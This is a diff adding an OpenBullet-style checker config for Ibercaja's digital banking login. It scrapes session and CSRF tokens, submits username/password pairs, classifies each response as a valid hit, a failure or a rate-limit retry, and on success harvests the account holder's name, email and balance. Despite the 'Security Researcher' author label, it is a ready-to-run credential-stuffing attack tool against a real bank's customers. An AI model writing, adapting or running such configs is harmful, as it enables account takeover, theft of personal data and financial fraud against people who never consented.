@@ -1,0 +1,128 @@
+[SETTINGS]
+Name = Ibercaja Banca Digital
+Author = Security Researcher
+Version = 1.0
+
+[SCRIPT]
+
+# === CONFIGURACIÓN INICIAL ===
+REQUEST GET "https://sgv.ibercaja.es/auth/login" 
+  AcceptEncoding: gzip, deflate, br
+  
+HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8"
+HEADER "Connection: keep-alive"
+HEADER "Upgrade-Insecure-Requests: 1"
+
+# Capturar la cookie PHPSESSID
+PARSE "<SOURCE>" LR "PHPSESSID=" ";" -> VAR "PHPSESSID"
+
+# === SEGUIR REDIRECCIÓN A IDENTIDAD ===
+REQUEST GET "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/connect/authorize" 
+  state: 028ddf864d1af8b4115898a2ae8e86b5
+  scope: iberfabric.omnicanalidad.canales.sgv.apigateway offline_access
+  response_type: code
+  approval_prompt: auto
+  redirect_uri: https://sgv.ibercaja.es/authenticated
+  client_id: EXT-SGV
+  bt: login
+  AcceptEncoding: gzip, deflate, br
+  
+HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>"
+HEADER "Referer: https://sgv.ibercaja.es/"
+
+# === OBTENER PÁGINA DE LOGIN ===
+REQUEST GET "<LOCATION>" 
+  AcceptEncoding: gzip, deflate, br
+  
+HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>"
+
+# Capturar tokens y valores del formulario
+PARSE "<SOURCE>" LR "name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\"" -> VAR "CSRF_TOKEN"
+PARSE "<SOURCE>" LR "name=\"Data\" type=\"hidden\" value=\"" "\"" -> VAR "DATA_TOKEN"
+PARSE "<SOURCE>" LR "name=\"ReturnUrl\" type=\"hidden\" value=\"" "\"" -> VAR "RETURN_URL"
+
+# Capturar cookies adicionales
+PARSE "<SOURCE>" LR "idsrv.session=" ";" -> VAR "IDSRV_SESSION"
+PARSE "<SOURCE>" LR ".AspNetCore.Antiforgery." ";" -> VAR "ANTIFORGERY"
+
+# === ENVIAR CREDENCIALES ===
+REQUEST POST "https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/Account/Login" 
+  ReturnUrl: <RETURN_URL>
+  Data: <DATA_TOKEN>
+  Username: <USER>
+  Password: <PASS>
+  __RequestVerificationToken: <CSRF_TOKEN>
+  AcceptEncoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  
+HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8"
+HEADER "Origin: https://identidad.ibercaja.es"
+HEADER "Referer: https://identidad.ibercaja.es/soporte/plataforma/identidad/api/v1/Account/Login"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>; idsrv.session=<IDSRV_SESSION>; .AspNetCore.Antiforgery.<ANTIFORGERY>"
+
+# === VERIFICACIÓN DE RESPUESTA ===
+KEYCHECK 
+  KEYCHAIN Failure OR
+    KEY "<SOURCE>" Contains "Usuario o contraseña incorrectos"
+    KEY "<SOURCE>" Contains "credenciales no válidas"
+    KEY "<SOURCE>" Contains "error"
+    KEY "<SOURCE>" Contains "bloqueado"
+    KEY "<SOURCE>" Contains "incorrecto"
+    KEY "<RESPONSECODE>" EqualTo "401"
+    KEY "<RESPONSECODE>" EqualTo "403"
+
+  KEYCHAIN Success OR
+    KEY "<SOURCE>" Contains "authenticated"
+    KEY "<SOURCE>" Contains "code="
+    KEY "<LOCATION>" Contains "/authenticated"
+    KEY "<LOCATION>" Contains "code="
+    KEY "<RESPONSECODE>" EqualTo "302"
+
+  KEYCHAIN Retry OR
+    KEY "<RESPONSECODE>" EqualTo "429"
+    KEY "<RESPONSECODE>" EqualTo "503"
+    KEY "<SOURCE>" Contains "demasiadas solicitudes"
+
+# === CAPTURA DE DATOS ADICIONALES ===
+#IF SUCCESS
+
+# Capturar código de autorización si existe
+PARSE "<LOCATION>" LR "code=" "&" -> VAR "AUTH_CODE"
+
+# Seguir redirección final si es necesario
+#IF "<AUTH_CODE>" != ""
+REQUEST GET "https://sgv.ibercaja.es/authenticated" 
+  code: <AUTH_CODE>
+  state: 028ddf864d1af8b4115898a2ae8e86b5
+  AcceptEncoding: gzip, deflate, br
+  
+HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+HEADER "Cookie: PHPSESSID=<PHPSESSID>"
+
+# Capturar información de la cuenta
+PARSE "<SOURCE>" LR "nombre\":" "\"" -> VAR "NOMBRE"
+PARSE "<SOURCE>" LR "apellidos\":" "\"" -> VAR "APELLIDOS"
+PARSE "<SOURCE>" LR "email\":" "\"" -> VAR "EMAIL"
+PARSE "<SOURCE>" LR "saldo\":" "," -> VAR "SALDO"
+
+#ENDIF
+#ENDIF
+
+[SETTINGS]
+RunOnCapture = True
+IgnoreResponseErrors = False
+MaxRedirects = 10
+ReadResponseSource = True
+EncodeData = True
+AcceptEncoding = gzip, deflate, br
+AllowAutoRedirect = False
